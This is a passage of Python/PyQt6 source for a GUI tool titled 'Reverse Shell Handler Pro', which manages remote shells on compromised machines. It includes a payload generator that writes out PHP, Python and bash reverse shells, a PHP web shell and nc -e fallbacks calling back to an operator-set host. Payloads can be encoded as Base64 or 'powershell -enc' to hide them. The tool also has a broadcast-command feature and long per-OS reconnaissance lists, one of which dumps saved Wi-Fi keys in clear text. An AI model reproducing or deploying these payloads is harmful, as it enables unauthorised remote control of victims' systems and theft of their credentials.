		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}}
	if (in_array($pipes[1], $read_a)) {{
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}}
	if (in_array($pipes[2], $read_a)) {{
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}}
}}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {{
	if (!$daemon) {{
		print "$string\n";
	}}
}}
?>"""
            elif ptype == "Web Shell":
                return """<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
Usage: http://target.com/shell.php?cmd=command"""
            else:
                return f"# Default {ptype} for {platform}\n# Example: nc -e /bin/sh {host} {port}"
        elif platform == "Python":
            if ptype == "Reverse Shell":
                return f"""python -c 'import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])'"""
            else:
                return f"# Default {ptype} for {platform}\n# Example: nc -e /bin/sh {host} {port}"
        elif platform == "Bash":
            if ptype == "Reverse Shell":
                return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
            else:
                return f"# Default {ptype} for {platform}\n# Example: nc -e /bin/sh {host} {port}"
        else:
            return f"# Default payload for {platform} {ptype}\n# Connect back to {host}:{port}"
    def _apply_encoding(self, payload, encoding):
        """Apply selected encoding to the payload"""
        if encoding == "Base64":
            import base64
            # For PowerShell, we need to encode the command properly
            if payload.startswith("powershell"):
                # Extract the command part
                cmd_part = payload.split("-c \"")[1].rstrip("\"") if "-c \"" in payload else payload
                encoded_bytes = base64.b64encode(cmd_part.encode('utf-16le'))
                return f"powershell -enc {encoded_bytes.decode()}"
            else:
                encoded_bytes = base64.b64encode(payload.encode())
                return encoded_bytes.decode()
        elif encoding == "Hex":
            return payload.encode().hex()
        elif encoding == "URL":
            import urllib.parse
            return urllib.parse.quote(payload)
        elif encoding == " powershell -enc":
            # Special case for PowerShell encoding
            if payload.startswith("powershell"):
                import base64
                # Extract the command part more carefully
                if "-c \"" in payload:
                    cmd_part = payload.split("-c \"")[1].rstrip("\"")
                elif "-c " in payload:
                    cmd_part = payload.split("-c ")[1]
                else:
                    cmd_part = payload # Fallback
                encoded_bytes = base64.b64encode(cmd_part.encode('utf-16le'))
                return f"powershell -enc {encoded_bytes.decode()}"
            else:
                return payload # If it's not a PowerShell command, return as is
        else:
            return payload
    def view_full_payload(self):
        """Open a new window to display the full payload"""
        if self.generated_payload:
            dialog = PayloadDisplayWindow(self.generated_payload, self)
            dialog.exec()
        else:
            QMessageBox.information(self, "No Payload", "Please generate a payload first.")
    def get_generated_payload(self):
        """Return the full generated payload text"""
        return self.generated_payload
# --- Fin de l'ajout/modification ---
class ServerSignals(QObject):
    new_shell = pyqtSignal(dict)
    shell_output = pyqtSignal(dict)
    shell_disconnected = pyqtSignal(dict)
    connection_status = pyqtSignal(bool)
    log_message = pyqtSignal(str)
    alert = pyqtSignal(str, str)  # type, message
    # --- Ajout du signal pour la liste des shells actifs ---
    active_shells_list = pyqtSignal(list)
    # --- Fin de l'ajout ---
class ReverseShellClient(QMainWindow):
    def __init__(self, server_host="127.0.0.1", server_port=5555):
        super().__init__()
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.connected = False
        self.shells = {}
        self.message_queue = deque()
        self.reconnect_timer = QTimer()
        self.reconnect_timer.timeout.connect(self.try_reconnect)
        # self.file_transfers = {} # Supprimé
        # self.transfer_threads = []  # Supprimé
        # Load saved settings
        self.load_settings()
        # Initialize server signals
        self.signals = ServerSignals()
        self.signals.new_shell.connect(self.add_shell_to_list)
        self.signals.shell_output.connect(self.update_shell_output)
        self.signals.shell_disconnected.connect(self.remove_shell_from_list)
        self.signals.connection_status.connect(self.update_connection_status)
        self.signals.log_message.connect(self.log_message)
        self.signals.alert.connect(self.show_alert)
        # --- Connexion du signal pour la liste des shells actifs ---
        self.signals.active_shells_list.connect(self.handle_active_shells_list)
        # --- Fin de l'ajout ---
        # Dictionnaire de commandes prédéfinies par OS
        self.predefined_commands = {
            "Windows": [
                ("IP Configuration", "ipconfig"),
                ("Running Processes", "tasklist"),
                ("Network Connections", "netstat -an"),
                ("System Information", "systeminfo"),
                ("Current User", "whoami"),
                ("List Users", "net user"),
                ("List Groups", "net localgroup"),
                ("ARP Table", "arp -a"),
                ("Routing Table", "route print"),
                ("Firewall Status", "netsh firewall show state"),
                ("Services", "sc query"),
                ("Scheduled Tasks", "schtasks /query"),
                ("Environment Variables", "set"),
                ("Disk Information", "wmic logicaldisk get size,freespace,caption"),
                ("Installed Programs", "wmic product get name,version"),
                ("Process Tree", "wmic process list brief"),
                ("Network Shares", "net share"),
                ("Logged On Users", "query user"),
                ("System Time", "time /t & date /t"),
                ("Directory Listing", "dir"),
                ("File Search", "dir /s /b *.txt"),
                ("Ping Test", "ping -n 1 127.0.0.1"),
                ("DNS Resolution", "nslookup google.com"),
                ("Display Network Interfaces", "ipconfig /all"),
                ("Display ARP Cache", "arp -a"),
                ("Display Routing Table", "route print"),
                ("Display Firewall Rules", "netsh advfirewall firewall show rule name=all"),
                ("Display Services", "sc query"),
                ("Display Scheduled Tasks", "schtasks /query /fo LIST"),
                ("Display Environment Variables", "set"),
                ("Display System Information", "systeminfo"),
                ("Display User Accounts", "net user"),
                ("Display Local Groups", "net localgroup"),
                ("Display Current Directory", "cd"),
                ("Display Current Date/Time", "echo %date% %time%"),
                ("Display Computer Name", "hostname"),
                ("Display OS Version", "ver"),
                ("Display RAM Information", "wmic computersystem get TotalPhysicalMemory"),
                ("Display CPU Information", "wmic cpu get name"),
                ("Display BIOS Information", "wmic bios get serialnumber,version"),
                ("Display Motherboard Information", "wmic baseboard get product,manufacturer"),
                ("Display Video Controller Information", "wmic path win32_videocontroller get name"),
                ("Display Sound Device Information", "wmic sounddev get name"),
                ("Display USB Devices", "wmic path win32_usbcontroller get name"),
                ("Display Printers", "wmic printer get name,drivername,portname"),
                ("Display Startup Programs", "wmic startup get caption,command"),
                ("Display Logon Sessions", "wmic logon get LogonId,LogonType"),
                ("Display Installed Updates", "wmic qfe get HotFixID,InstalledOn"),
                ("Display Running Services", "tasklist /svc"),
                ("Display Listening Ports", "netstat -an | findstr LISTENING"),
                ("Display Established Connections", "netstat -an | findstr ESTABLISHED"),
                ("Display All Connections", "netstat -an"),
                ("Display Network Statistics", "netstat -s"),
                ("Display Interface Statistics", "netstat -i"),
                ("Display MAC Address", "getmac"),
                ("Display IP Configuration", "ipconfig /all"),
                ("Display DNS Cache", "ipconfig /displaydns"),
                ("Flush DNS Cache", "ipconfig /flushdns"),
                ("Release IP Address", "ipconfig /release"),
                ("Renew IP Address", "ipconfig /renew"),
                ("Display Network Statistics", "netstat -e"),
                ("Display Network Parameters", "nbtstat -n"),
                ("Display NetBIOS Sessions", "nbtstat -s"),
                ("Display TCP/IP Statistics", "netstat -p tcp"),
                ("Display UDP Statistics", "netstat -p udp"),
                ("Display ICMP Statistics", "netstat -p icmp"),
                ("Display IP Statistics", "netstat -p ip"),
                ("Display IPv6 Statistics", "netstat -p ipv6"),
                ("Display Network Configuration", "netsh interface show interface"),
                ("Display Wireless Network Profiles", "netsh wlan show profiles"),
                ("Display Wireless Network Interfaces", "netsh wlan show interfaces"),
                ("Display Wireless Network Drivers", "netsh wlan show drivers"),
                ("Display Wireless Network Settings", "netsh wlan show settings"),
                ("Display Wireless Network Capabilities", "netsh wlan show capabilities"),
                ("Display Wireless Network Networks", "netsh wlan show networks"),
                ("Display Wireless Network Profiles (with keys)", "netsh wlan show profiles name=* key=clear"),
                ("Display Network Adapter Information", "wmic nic get name,adaptertype,macaddress"),
                ("Display Network Adapter Configuration", "wmic nicconfig get ipaddress,ipsubnet,gatewaycostmetric"),
                ("Display Network Adapter Statistics", "wmic nic get name,bytesreceived,bytessent"),
                ("Display Network Adapter Errors", "wmic nic get name,packetsreceivederrors,packetstransmittederrors"),
                ("Display Network Adapter Speed", "wmic nic get name,speed"),
                ("Display Network Adapter Status", "wmic nic get name,status"),
                ("Display Network Adapter Manufacturer", "wmic nic get name,manufacturer"),
                ("Display Network Adapter Product Name", "wmic nic get name,productname"),
                ("Display Network Adapter Device ID", "wmic nic get name,deviceid"),
                ("Display Network Adapter PNP Device ID", "wmic nic get name,pnpdeviceid"),
                ("Display Network Adapter Service Name", "wmic nic get name,servicename"),
                ("Display Network Adapter Index", "wmic nic get name,index"),
                ("Display Network Adapter Interface Index", "wmic nic get name,interfaceindex"),
                ("Display Network Adapter GUID", "wmic nic get name,guid"),
                ("Display Network Adapter Time of Last Reset", "wmic nic get name,timelastreset"),
                ("Display Network Adapter Max Speed", "wmic nic get name,maxspeed"),
                ("Display Network Adapter Installed", "wmic nic get name,installed"),
                ("Display Network Adapter Physical Adapter", "wmic nic get name,physicaladapter"),
                ("Display Network Adapter MAC Address", "wmic nic get name,macaddress"),
                ("Display Network Adapter Adapter Type", "wmic nic get name,adaptertype"),
                ("Display Network Adapter Adapter Type ID", "wmic nic get name,adaptertypeid"),
                ("Display Network Adapter AutoSense", "wmic nic get name,autosense"),
                ("Display Network Adapter Availability", "wmic nic get name,availability"),
                ("Display Network Adapter Caption", "wmic nic get name,caption"),
                ("Display Network Adapter Config Manager Error Code", "wmic nic get name,configmanagererrorcode"),
                ("Display Network Adapter Config Manager User Config", "wmic nic get name,configmanageruserconfig"),
                ("Display Network Adapter Creation Class Name", "wmic nic get name,creationclassname"),
                ("Display Network Adapter Description", "wmic nic get name,description"),
                ("Display Network Adapter Device ID", "wmic nic get name,deviceid"),
                ("Display Network Adapter Error Cleared", "wmic nic get name,errorcleared"),
                ("Display Network Adapter Error Description", "wmic nic get name,errordescription"),
                ("Display Network Adapter Index", "wmic nic get name,index"),
                ("Display Network Adapter Install Date", "wmic nic get name,installdate"),
                ("Display Network Adapter Interface Index", "wmic nic get name,interfaceindex"),
                ("Display Network Adapter Last Error Code", "wmic nic get name,lasterrorcode"),
                ("Display Network Adapter Name", "wmic nic get name,name"),
                ("Display Network Adapter PNP Device ID", "wmic nic get name,pnpdeviceid"),
                ("Display Network Adapter Power Management Capabilities", "wmic nic get name,powermanagementcapabilities"),
                ("Display Network Adapter Power Management Supported", "wmic nic get name,powermanagementsupported"),
                ("Display Network Adapter Service Name", "wmic nic get name,servicename"),
                ("Display Network Adapter Status", "wmic nic get name,status"),
                ("Display Network Adapter Status Info", "wmic nic get name,statusinfo"),
                ("Display Network Adapter System Creation Class Name", "wmic nic get name,systemcreationclassname"),
                ("Display Network Adapter System Name", "wmic nic get name,systemname"),
                ("Display Network Adapter Time of Last Reset", "wmic nic get name,timelastreset")
            ],
            "Linux": [
                ("IP Configuration", "ip addr show"),
                ("Running Processes", "ps aux"),
                ("Network Connections", "netstat -tuln"),
                ("System Information", "uname -a"),
                ("Current User", "whoami"),
                ("List Users", "cat /etc/passwd"),
                ("List Groups", "cat /etc/group"),
                ("ARP Table", "arp -a"),
                ("Routing Table", "route -n"),
                ("Firewall Status", "iptables -L"),
                ("Services", "systemctl list-units --type=service"),
                ("Scheduled Tasks", "crontab -l"),
                ("Environment Variables", "env"),
                ("Disk Information", "df -h"),
                ("Installed Programs", "dpkg -l"),  # Debian/Ubuntu
                ("Installed Programs", "rpm -qa"),   # RedHat/CentOS
                ("Process Tree", "pstree"),
                ("Network Shares", "mount | grep nfs"),
                ("Logged On Users", "who"),
                ("System Time", "date"),
                ("Directory Listing", "ls -la"),
                ("File Search", "find / -name '*.txt' 2>/dev/null"),
                ("Ping Test", "ping -c 1 127.0.0.1"),
                ("DNS Resolution", "nslookup google.com"),
                ("Display Network Interfaces", "ifconfig -a"),
                ("Display ARP Cache", "arp -a"),
                ("Display Routing Table", "route -n"),
                ("Display Firewall Rules", "iptables -L"),
                ("Display Services", "systemctl list-units --type=service"),
                ("Display Scheduled Tasks", "crontab -l"),
                ("Display Environment Variables", "env"),
                ("Display System Information", "uname -a"),
                ("Display User Accounts", "cat /etc/passwd"),
                ("Display Local Groups", "cat /etc/group"),
                ("Display Current Directory", "pwd"),
                ("Display Current Date/Time", "date"),
                ("Display Computer Name", "hostname"),
                ("Display OS Version", "cat /etc/os-release"),
                ("Display RAM Information", "free -h"),
                ("Display CPU Information", "lscpu"),
                ("Display BIOS Information", "dmidecode -t bios"),
                ("Display Motherboard Information", "dmidecode -t baseboard"),
                ("Display Video Controller Information", "lspci | grep VGA"),
                ("Display Sound Device Information", "lspci | grep Audio"),
                ("Display USB Devices", "lsusb"),
                ("Display Printers", "lpstat -p"),
                ("Display Startup Programs", "systemctl list-unit-files --type=service | grep enabled"),
                ("Display Logon Sessions", "last"),
                ("Display Installed Updates", "apt list --installed"),  # Debian/Ubuntu
                ("Display Installed Updates", "yum list installed"),    # RedHat/CentOS
                ("Display Running Services", "systemctl list-units --type=service --state=running"),
                ("Display Listening Ports", "netstat -tuln"),
                ("Display Established Connections", "netstat -an | grep ESTABLISHED"),
                ("Display All Connections", "netstat -an"),
                ("Display Network Statistics", "netstat -s"),
                ("Display Interface Statistics", "ifconfig"),
                ("Display MAC Address", "ip link show"),
                ("Display IP Configuration", "ip addr show"),
                ("Display DNS Cache", "systemd-resolve --statistics"),
                ("Flush DNS Cache", "systemd-resolve --flush-caches"),
                ("Release IP Address", "dhclient -r"),
                ("Renew IP Address", "dhclient"),
                ("Display Network Statistics", "ss -tuln"),
                ("Display Network Parameters", "sysctl net"),
                ("Display TCP/IP Statistics", "ss -t"),
                ("Display UDP Statistics", "ss -u"),
                ("Display ICMP Statistics", "cat /proc/net/snmp | grep Icmp"),
                ("Display IP Statistics", "cat /proc/net/snmp | grep Ip"),
                ("Display IPv6 Statistics", "cat /proc/net/snmp6"),
                ("Display Network Configuration", "cat /etc/network/interfaces"),
                ("Display Wireless Network Profiles", "iwconfig"),
                ("Display Wireless Network Interfaces", "iw dev"),
                ("Display Wireless Network Drivers", "lsmod | grep iw"),
                ("Display Wireless Network Settings", "iwconfig"),
                ("Display Wireless Network Capabilities", "iw list"),
                ("Display Wireless Network Networks", "iwlist scan"),
                ("Display Network Adapter Information", "lspci | grep Ethernet"),
                ("Display Network Adapter Configuration", "ip addr show"),
                ("Display Network Adapter Statistics", "cat /proc/net/dev"),
                ("Display Network Adapter Errors", "dmesg | grep -i error"),
                ("Display Network Adapter Speed", "ethtool eth0"),
                ("Display Network Adapter Status", "ip link show"),
                ("Display Network Adapter Manufacturer", "lspci -v | grep -A 10 Ethernet"),
                ("Display Network Adapter Product Name", "lshw -class network"),
                ("Display Network Adapter Device ID", "lspci -nn | grep Ethernet"),
                ("Display Network Adapter PNP Device ID", "ls /sys/class/net/"),
                ("Display Network Adapter Service Name", "systemctl status networking"),
                ("Display Network Adapter Index", "cat /proc/net/dev"),
                ("Display Network Adapter Interface Index", "ip link show"),
                ("Display Network Adapter GUID", "cat /sys/class/net/*/address"),
                ("Display Network Adapter Time of Last Reset", "dmesg | grep -i reset")
            ],
            "macOS": [
                ("IP Configuration", "ifconfig"),
                ("Running Processes", "ps aux"),
                ("Network Connections", "netstat -an"),
                ("System Information", "sw_vers"),
                ("Current User", "whoami"),
                ("List Users", "dscl . -list /Users"),
                ("List Groups", "dscl . -list /Groups"),
                ("ARP Table", "arp -a"),
                ("Routing Table", "netstat -rn"),
                ("Firewall Status", "pfctl -sr"),
                ("Services", "launchctl list"),
                ("Scheduled Tasks", "crontab -l"),
                ("Environment Variables", "env"),
                ("Disk Information", "df -h"),
                ("Installed Programs", "ls /Applications"),
                ("Process Tree", "pstree"),
                ("Network Shares", "mount | grep afp"),
                ("Logged On Users", "who"),
                ("System Time", "date"),
                ("Directory Listing", "ls -la"),
                ("File Search", "find / -name '*.txt' 2>/dev/null"),
                ("Ping Test", "ping -c 1 127.0.0.1"),
                ("DNS Resolution", "nslookup google.com"),
                ("Display Network Interfaces", "ifconfig -a"),
                ("Display ARP Cache", "arp -a"),
                ("Display Routing Table", "netstat -rn"),
                ("Display Firewall Rules", "pfctl -sr"),
                ("Display Services", "launchctl list"),
                ("Display Scheduled Tasks", "crontab -l"),
                ("Display Environment Variables", "env"),
                ("Display System Information", "sw_vers"),
                ("Display User Accounts", "dscl . -list /Users"),
                ("Display Local Groups", "dscl . -list /Groups"),
                ("Display Current Directory", "pwd"),
                ("Display Current Date/Time", "date"),
                ("Display Computer Name", "hostname"),
                ("Display OS Version", "sw_vers"),
                ("Display RAM Information", "vm_stat"),
                ("Display CPU Information", "sysctl -n machdep.cpu.brand_string"),
                ("Display BIOS Information", "system_profiler SPHardwareDataType | grep 'Boot ROM Version'"),
                ("Display Motherboard Information", "system_profiler SPHardwareDataType"),
                ("Display Video Controller Information", "system_profiler SPDisplaysDataType"),
                ("Display Sound Device Information", "system_profiler SPAudioDataType"),
                ("Display USB Devices", "system_profiler SPUSBDataType"),
                ("Display Printers", "lpstat -p"),
                ("Display Startup Programs", "launchctl list | grep -v apple"),
                ("Display Logon Sessions", "last"),
                ("Display Installed Updates", "softwareupdate -l"),
                ("Display Running Services", "launchctl list | grep -v apple"),
                ("Display Listening Ports", "lsof -i -P | grep LISTEN"),
                ("Display Established Connections", "lsof -i -P | grep ESTABLISHED"),
                ("Display All Connections", "lsof -i -P"),
                ("Display Network Statistics", "netstat -s"),
                ("Display Interface Statistics", "ifconfig"),
                ("Display MAC Address", "ifconfig en0 | grep ether"),
                ("Display IP Configuration", "ifconfig"),
                ("Display DNS Cache", "dscacheutil -cachedump"),
                ("Flush DNS Cache", "dscacheutil -flushcache"),
                ("Release IP Address", "ipconfig set en0 DHCP"),
                ("Renew IP Address", "ipconfig set en0 DHCP"),
                ("Display Network Statistics", "netstat -i"),
                ("Display Network Parameters", "sysctl net"),
                ("Display TCP/IP Statistics", "netstat -p tcp"),
                ("Display UDP Statistics", "netstat -p udp"),
                ("Display ICMP Statistics", "netstat -s | grep icmp"),
                ("Display IP Statistics", "netstat -s | grep ip"),
                ("Display IPv6 Statistics", "netstat -s | grep ipv6"),
                ("Display Network Configuration", "networksetup -listallnetworkservices"),
                ("Display Wireless Network Profiles", "networksetup -getairportnetwork en0"),
                ("Display Wireless Network Interfaces", "networksetup -listallhardwareports"),
                ("Display Wireless Network Drivers", "kextstat | grep AirPort"),
                ("Display Wireless Network Settings", "networksetup -getinfo Wi-Fi"),
                ("Display Wireless Network Capabilities", "system_profiler SPAirPortDataType"),
                ("Display Wireless Network Networks", "airport -s"),
                ("Display Network Adapter Information", "networksetup -listallhardwareports"),
                ("Display Network Adapter Configuration", "ifconfig"),
                ("Display Network Adapter Statistics", "netstat -i"),
                ("Display Network Adapter Errors", "dmesg | grep -i error"),
                ("Display Network Adapter Speed", "ifconfig en0 | grep media"),
                ("Display Network Adapter Status", "ifconfig en0"),
                ("Display Network Adapter Manufacturer", "system_profiler SPHardwareDataType"),
                ("Display Network Adapter Product Name", "system_profiler SPHardwareDataType"),
                ("Display Network Adapter Device ID", "system_profiler SPHardwareDataType"),
                ("Display Network Adapter PNP Device ID", "networksetup -listallhardwareports"),
                ("Display Network Adapter Service Name", "launchctl list | grep network"),
                ("Display Network Adapter Index", "ifconfig"),
                ("Display Network Adapter Interface Index", "ifconfig"),
                ("Display Network Adapter GUID", "networksetup -listallhardwareports"),
                ("Display Network Adapter Time of Last Reset", "dmesg | grep -i reset")
            ],
            "Android": [
                ("IP Configuration", "ip addr show"),
                ("Running Processes", "ps"),
                ("Network Connections", "netstat"),
                ("System Information", "getprop ro.build.fingerprint"),
                ("Current User", "whoami"),
                ("List Users", "pm list users"),
                ("List Groups", "groups"),
                ("ARP Table", "cat /proc/net/arp"),
                ("Routing Table", "cat /proc/net/route"),
                ("Firewall Status", "iptables -L"),
                ("Services", "dumpsys activity services"),
                ("Scheduled Tasks", "cmd appops"),
                ("Environment Variables", "printenv"),
                ("Disk Information", "df"),
                ("Installed Programs", "pm list packages"),
                ("Process Tree", "ps -t"),
                ("Network Shares", "mount"),
                ("Logged On Users", "who"),
                ("System Time", "date"),
                ("Directory Listing", "ls -l"),
                ("File Search", "find / -name '*.apk' 2>/dev/null"),
                ("Ping Test", "ping -c 1 127.0.0.1"),
                ("DNS Resolution", "nslookup google.com"),
                ("Display Network Interfaces", "ifconfig"),
                ("Display ARP Cache", "cat /proc/net/arp"),
                ("Display Routing Table", "cat /proc/net/route"),
                ("Display Firewall Rules", "iptables -L"),
                ("Display Services", "dumpsys activity services"),
                ("Display Scheduled Tasks", "cmd appops"),
                ("Display Environment Variables", "printenv"),
                ("Display System Information", "getprop"),
                ("Display User Accounts", "pm list users"),
                ("Display Local Groups", "groups"),
                ("Display Current Directory", "pwd"),
                ("Display Current Date/Time", "date"),
                ("Display Computer Name", "getprop net.hostname"),
                ("Display OS Version", "getprop ro.build.version.release"),
                ("Display RAM Information", "cat /proc/meminfo"),
                ("Display CPU Information", "cat /proc/cpuinfo"),
                ("Display BIOS Information", "getprop ro.boot.bootloader"),
                ("Display Motherboard Information", "getprop ro.product.board"),
                ("Display Video Controller Information", "dumpsys SurfaceFlinger"),
                ("Display Sound Device Information", "dumpsys audio"),
                ("Display USB Devices", "ls /dev/bus/usb/"),
                ("Display Printers", "ls /dev/usb/"),
                ("Display Startup Programs", "dumpsys activity broadcasts"),
                ("Display Logon Sessions", "logcat -d"),
                ("Display Installed Updates", "dumpsys package"),
                ("Display Running Services", "dumpsys activity services"),
                ("Display Listening Ports", "netstat -tuln"),
                ("Display Established Connections", "netstat | grep ESTABLISHED"),
                ("Display All Connections", "netstat"),
                ("Display Network Statistics", "cat /proc/net/dev"),
                ("Display Interface Statistics", "ifconfig"),
                ("Display MAC Address", "cat /sys/class/net/wlan0/address"),
                ("Display IP Configuration", "ip addr show"),
                ("Display DNS Cache", "getprop net.dns1"),
                ("Flush DNS Cache", "ndc resolver flushdefaultif"),
                ("Release IP Address", "dhcpcd -k wlan0"),
                ("Renew IP Address", "dhcpcd wlan0"),
                ("Display Network Statistics", "cat /proc/net/snmp"),
                ("Display Network Parameters", "getprop | grep net"),
                ("Display TCP/IP Statistics", "cat /proc/net/tcp"),
                ("Display UDP Statistics", "cat /proc/net/udp"),
                ("Display ICMP Statistics", "cat /proc/net/icmp"),
                ("Display IP Statistics", "cat /proc/net/ip"),
                ("Display IPv6 Statistics", "cat /proc/net/snmp6"),
                ("Display Network Configuration", "dumpsys connectivity"),
                ("Display Wireless Network Profiles", "dumpsys wifi"),
                ("Display Wireless Network Interfaces", "ifconfig wlan0"),
                ("Display Wireless Network Drivers", "lsmod | grep wlan"),
                ("Display Wireless Network Settings", "dumpsys wifi"),
                ("Display Wireless Network Capabilities", "iw list"),
                ("Display Wireless Network Networks", "iwlist wlan0 scan"),
                ("Display Network Adapter Information", "ls /sys/class/net/"),
                ("Display Network Adapter Configuration", "ip addr show"),
                ("Display Network Adapter Statistics", "cat /proc/net/dev"),
                ("Display Network Adapter Errors", "dmesg | grep -i error"),
                ("Display Network Adapter Speed", "ethtool wlan0"),
                ("Display Network Adapter Status", "ifconfig wlan0"),
                ("Display Network Adapter Manufacturer", "getprop ro.product.manufacturer"),
                ("Display Network Adapter Product Name", "getprop ro.product.model"),
                ("Display Network Adapter Device ID", "getprop ro.serialno"),
                ("Display Network Adapter PNP Device ID", "ls /sys/class/net/"),
                ("Display Network Adapter Service Name", "dumpsys connectivity"),
                ("Display Network Adapter Index", "cat /proc/net/dev"),
                ("Display Network Adapter Interface Index", "ip link show"),
                ("Display Network Adapter GUID", "cat /sys/class/net/*/address"),
                ("Display Network Adapter Time of Last Reset", "dmesg | grep -i reset")
            ]
        }
        self.setup_ui()
        self.setup_connections()
        # Connect automatically on startup if settings exist
        if hasattr(self, 'auto_connect') and self.auto_connect:
            # Démarrer la connexion après l'affichage de la fenêtre
            QTimer.singleShot(100, self.connect_to_server)
        # --- Ajout pour l'animation du panneau latéral ---
        self.sidebar_animation = None
        # --- Fin de l'ajout ---
        # --- Ajout pour l'animation du statut ---
        self.status_animation = None
        # --- Fin de l'ajout ---
    def load_settings(self):
        """Load saved server settings"""
        try:
            if os.path.exists("ReverseShellHandler.conf"):
                with open("ReverseShellHandler.conf", "r") as f:
                    settings = json.load(f)
                    self.server_host = settings.get('server_host', self.server_host)
                    self.server_port = settings.get('server_port', self.server_port)
                    # Load auto-connect setting
                    self.auto_connect = settings.get('auto_connect', False)
                    # --- Chargement des paramètres MP3 (Ajouté) ---
                    self.mp3_enabled = settings.get('mp3_enabled', False)
                    self.mp3_file_path = settings.get('mp3_file_path', "")
                    # --- Chargement des paramètres Proxy (Ajouté) ---
                    self.proxy_enabled = settings.get('proxy_enabled', False)
                    self.proxy_type = settings.get('proxy_type', 'SOCKS5')
                    self.proxy_host = settings.get('proxy_host', '')
                    self.proxy_port = settings.get('proxy_port', '')
                    self.proxy_user = settings.get('proxy_user', '')
                    self.proxy_pass = settings.get('proxy_pass', '')
                    # --- Fin de l'ajout ---
            else:
                 # Définir les valeurs par défaut si le fichier n'existe pas
                 self.auto_connect = False
                 # --- Valeurs par défaut pour les paramètres MP3 (Ajouté) ---
                 self.mp3_enabled = False
                 self.mp3_file_path = ""
                 # --- Valeurs par défaut pour les paramètres Proxy (Ajouté) ---
                 self.proxy_enabled = False
                 self.proxy_type = 'SOCKS5'
                 self.proxy_host = ''
                 self.proxy_port = ''
                 self.proxy_user = ''
                 self.proxy_pass = ''
                 # --- Fin de l'ajout ---
        except Exception as e:
            print(f"Error loading settings: {e}")
            # Définir les valeurs par défaut en cas d'erreur
            self.auto_connect = False
            # --- Valeurs par défaut pour les paramètres MP3 (Ajouté) ---
            self.mp3_enabled = False
            self.mp3_file_path = ""
            # --- Valeurs par défaut pour les paramètres Proxy (Ajouté) ---
            self.proxy_enabled = False
            self.proxy_type = 'SOCKS5'
            self.proxy_host = ''
            self.proxy_port = ''
            self.proxy_user = ''
            self.proxy_pass = ''
            # --- Fin de l'ajout ---
    def save_settings(self):
        """Save server settings"""
        try:
            settings = {
                'server_host': self.host_input.text(),
                'server_port': int(self.port_input.text()),
                'auto_connect': self.auto_connect,  # Sauvegarder le paramètre
                # --- Sauvegarde des paramètres MP3 (Ajouté) ---
                'mp3_enabled': self.mp3_alert_checkbox.isChecked(),
                'mp3_file_path': self.mp3_file_input.text(),
                # --- Sauvegarde des paramètres Proxy (Ajouté) ---
                'proxy_enabled': self.proxy_enabled_checkbox.isChecked(),
                'proxy_type': self.proxy_type_combo.currentText(),
                'proxy_host': self.proxy_host_input.text(),
                'proxy_port': self.proxy_port_input.text(),
                'proxy_user': self.proxy_user_input.text(),
                'proxy_pass': self.proxy_pass_input.text(),
                # --- Fin de l'ajout ---
            }
            with open("ReverseShellHandler.conf", "w") as f:
                json.dump(settings, f)
        except Exception as e:
            print(f"Error saving settings: {e}")
    def setup_ui(self):
        """Setup the modern PyQt6 interface with PuTTY-style terminal"""
        self.setWindowTitle("Reverse Shell Handler Pro")
        self.setGeometry(100, 100, 1680, 900)
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        # Main horizontal splitter (left panel | central area | right panel)
        self.main_splitter = QSplitter(Qt.Orientation.Horizontal)
        self.main_splitter.setChildrenCollapsible(False)
        layout = QHBoxLayout(central_widget)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.addWidget(self.main_splitter)
        # Left panel for dashboard and other controls
        self.left_panel = QWidget()
        self.left_panel.setFixedWidth(300)  # Largeur initiale, mais sera gérée par le splitter
        self.left_panel.setMinimumWidth(150)  # Largeur minimale
        left_layout = QVBoxLayout(self.left_panel)
        left_layout.setContentsMargins(8, 8, 8, 8)
        # Dashboard group
        dashboard_group = QGroupBox("Dashboard")
        dashboard_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #3E3E40;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #CCCCCC;
            }
        """)
        dashboard_layout = QVBoxLayout(dashboard_group)
        # Shells counter
        self.shells_count_label = QLabel("Active Shells: 0")
        self.shells_count_label.setStyleSheet("color: #7FDC7F; font-weight: bold;")
        dashboard_layout.addWidget(self.shells_count_label)
        # System info
        self.system_info_label = QLabel("System: Unknown")
        self.system_info_label.setStyleSheet("color: #CCCCCC;")
        dashboard_layout.addWidget(self.system_info_label)
        left_layout.addWidget(dashboard_group)
        # --- Payload Generator (Ajouté ici) ---
        self.payload_generator_group = PayloadGeneratorWidget()
        # Encapsuler dans un QGroupBox pour cohérence visuelle
        payload_group_box = QGroupBox("Payload Generator")
        payload_group_box.setStyleSheet(dashboard_group.styleSheet())
        payload_layout = QVBoxLayout(payload_group_box)
        payload_layout.addWidget(self.payload_generator_group)
        left_layout.addWidget(payload_group_box)
        # --- Fin de l'ajout ---
        # Quick actions (Bouton Generate Payload supprimé)
        quick_actions = QGroupBox("Quick Actions")
        quick_actions.setStyleSheet(dashboard_group.styleSheet())
        quick_layout = QVBoxLayout(quick_actions)
        # --- Bouton Upload File supprimé ---
        # self.upload_btn = QPushButton("Upload File")
        # self.upload_btn.clicked.connect(self.upload_file)
        # quick_layout.addWidget(self.upload_btn)
        # Broadcast command
        self.broadcast_btn = QPushButton("Broadcast Command")
        self.broadcast_btn.clicked.connect(self.broadcast_command)
